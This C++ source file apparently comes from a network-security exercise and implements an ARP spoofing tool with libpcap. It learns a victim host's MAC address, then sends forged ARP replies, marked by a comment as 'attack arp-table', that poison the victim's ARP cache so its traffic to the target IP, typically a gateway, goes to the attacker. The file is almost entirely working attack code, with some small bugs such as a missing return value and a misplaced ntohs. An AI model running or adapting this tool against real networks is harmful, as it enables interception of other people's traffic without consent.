#include <cstdio>
#include <unistd.h>
#include <pcap.h>
#include <sys/ioctl.h>
#include <net/if.h>
#include <netinet/ether.h>
#include "ethhdr.h"
#include "arphdr.h"

#pragma pack(push, 1)

struct EthArpPacket 
{
	EthHdr eth_;
	ArpHdr arp_;
};
#pragma pack(pop)

void usage() 
{
	printf("syntax: send-arp-test <interface> <sender ip> <target ip>\n");
	printf("sample: send-arp wlan0 192.168.10.2 192.168.10.1\n");
}

int get_my_ip(char* dev, char* myip)
{
	int sock;
	struct ifreq ifr;
 
    sock = socket(AF_INET, SOCK_DGRAM, 0);
    strncpy(ifr.ifr_name, dev, IFNAMSIZ);
 	
 	if(sock < 0)
 	{
 		printf("[!] get_my_ip socket error\n");
 		return -1;
 	}

    if (ioctl(sock, SIOCGIFADDR, &ifr) < 0) 
    {
        printf("[!] get_my_ip error\n");
        close(sock);
        return -1;
    } 
    else 
    {
        inet_ntop(AF_INET, ifr.ifr_addr.sa_data+2, myip, sizeof(struct sockaddr));
        close(sock);
        return 0;
    }

}

void convrt_mac(const char* data, char* cvrt_str, int sz)
{

     char buf[128] = {0,};
     char t_buf[8];
     char *stp = strtok((char *)data , ":");
     int temp=0;

     do
     {
          memset(t_buf, 0, sizeof(t_buf));
          sscanf(stp, "%x", &temp );
          snprintf(t_buf, sizeof(t_buf)-1, "%02X", temp);
          strncat(buf, t_buf, sizeof(buf)-1);
          strncat(buf, ":", sizeof(buf)-1);
     } while((stp = strtok(NULL , ":")) != NULL);

     buf[strlen(buf) - 1] = '\0';
     strncpy(cvrt_str, buf, sz);
}

int get_my_mac(char* dev, char* mymac)
{
	int sock;
	struct ifreq ifr;
	char mac_adr[18] = {0,};

	sock = socket(AF_INET, SOCK_STREAM, 0);
	strncpy(ifr.ifr_name, dev, IFNAMSIZ);

	if(sock < 0)
 	{
 		printf("[!] get_my_mac socket error\n");
 		return -1;
 	}

	if (ioctl(sock, SIOCGIFHWADDR, &ifr) < 0)    
	{
        printf("[!] get_my_mac error\n");
        close(sock);
        return -1;
	}

	convrt_mac(ether_ntoa((struct ether_addr *)(ifr.ifr_hwaddr.sa_data)), mac_adr, sizeof(mac_adr) -1 );
	strncpy(mymac, mac_adr, 18);

	close(sock);
	return 0;
}

int send_arp(char* dev, char* smac, char* sip, char* tmac, char* tip, int op)
{
	char errbuf[PCAP_ERRBUF_SIZE];
	pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf);
	if (handle == nullptr) 
	{
		fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
		return -1;
	}

	EthArpPacket packet;
	packet.eth_.smac_ = Mac(smac);
	packet.eth_.dmac_ = Mac(tmac);
	packet.eth_.type_ = htons(EthHdr::Arp);

	packet.arp_.hrd_ = htons(ArpHdr::ETHER);
	packet.arp_.pro_ = htons(EthHdr::Ip4);
	packet.arp_.hln_ = Mac::SIZE;
	packet.arp_.pln_ = Ip::SIZE;
	packet.arp_.op_ = htons(op);
	packet.arp_.smac_ = Mac(smac);
	packet.arp_.sip_ = htonl(Ip(sip));
	if(op == ARPOP_REQUEST)
		packet.arp_.tmac_ = Mac("00:00:00:00:00:00");
	else
		packet.arp_.tmac_ = Mac(tmac);
	packet.arp_.tip_ = htonl(Ip(tip));

	int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
	if(res != 0) 
	{
		fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
	}

	pcap_close(handle);

	sleep(1);

}

int main(int argc, char* argv[]) 
{
	if ( (argc%2) != 0 ) 
	{
		usage();
		return -1;
	}

	char* dev = argv[1];
	char myip[20] = {0,};
	char mymac[20] = {0,};
	char smac[20] = {0,};
	char* sip;
	char* tip;

	char errbuf[PCAP_ERRBUF_SIZE];
	pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf);

	if (handle == nullptr) 
	{
		fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
		return -1;
	}

	for(int i = 2; i < argc ; i += 2)
	{
		sip = argv[i];
		tip = argv[i + 1];

		// get my ip & my mac
		get_my_ip(dev, myip);
		get_my_mac(dev, mymac);

		// arp request (which mac has sender ip?)
		send_arp(dev, mymac, myip, "ff:ff:ff:ff:ff:ff", sip, ARPOP_REQUEST);

		// get response
		struct pcap_pkthdr* header;
		const u_char* pkt;
		while(1)
		{
			int r = pcap_next_ex(handle, &header, &pkt);
			struct EthArpPacket* packet = (struct EthArpPacket*)pkt;
			if(ntohs(packet->eth_.type_ == htons(EthHdr::Arp))) break;
		}
		struct EthArpPacket* packet = (struct EthArpPacket*)pkt;
		Mac mac = packet->arp_.smac_;
		strcpy(smac, std::string(mac).c_str());

		// attack arp-table
		send_arp(dev, mymac, tip, smac, sip, ARPOP_REPLY);
		sleep(1);
	}



}